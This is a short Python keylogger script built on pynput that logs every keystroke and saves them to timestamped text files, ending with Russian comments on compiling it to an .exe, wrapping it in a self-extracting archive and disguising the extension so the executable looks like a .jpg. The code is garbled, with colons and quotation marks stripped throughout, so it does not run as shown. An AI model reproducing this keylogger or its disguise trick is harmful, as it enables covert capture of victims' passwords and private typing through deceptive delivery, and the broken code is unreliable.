import pynput
from datetime import datetime
from pynput.keyboard import Key, Listener

class Keylogger
    def __init__(self)
        self.count = 0
        self.keys = []
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def on_press(self, key)
        print(f{key} pressed)

        self.keys.append(key)
        self.count += 1

        if self.count =10
            self.to_file(self.keys)


    def on_release(self, key)
        if key == Key.esc
            return False

    def to_file(self, keys)
        start_dt_str = str(self.start_dt)[-7].replace( , -).replace(, )
        end_dt_str = str(self.end_dt)[-7].replace( , -).replace(, )
        self.filename = fkeylog-{start_dt_str}_{end_dt_str}
        with open(f{self.filename}.txt, w) as f
            for key in self.keys
                k = str(key).replace(', )

                if k.find(space)  0
                    f.write(n)
                elif k.find(Key) == -1
                    f.write(k)
        print(fSaved {self.filename}.txt)


if __name__ == __main__
    obj = Keylogger()
    with Listener(on_press=obj.on_press, on_release=obj.on_release) as listener
        listener.join()

# дальше нужно было конвернуть в .exe, после чего создать sfx архив, поменять exe налево с помощью изменения читания, что то такое, 
# к примеру mainjpg.exe будет - mainexe.jpg но это только один из способов 